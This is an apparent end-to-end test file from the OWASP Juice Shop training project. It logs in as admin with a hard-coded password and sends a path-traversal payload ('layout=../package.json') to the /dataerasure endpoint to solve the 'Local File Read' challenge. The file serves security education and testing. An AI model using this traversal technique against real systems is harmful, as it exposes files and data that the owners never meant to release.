/*
 * Copyright (c) 2014-2021 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')

describe('/dataerasure', () => {
  protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

  describe('challenge "lfr"', () => {
    it('should be possible to perform local file read attack using the browser', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(baseUrl => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            console.log('Success')
          }
        }
        const params = 'layout=../package.json'

        xhttp.open('POST', `${baseUrl}/dataerasure`)
        xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
        xhttp.setRequestHeader('Origin', baseUrl)
        xhttp.setRequestHeader('Cookie', `token=${localStorage.getItem('token')}`)
                xhttp.send(params) //eslint-disable-line
      }, browser.baseUrl)

      browser.driver.sleep(10000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Local File Read' })
  })
})
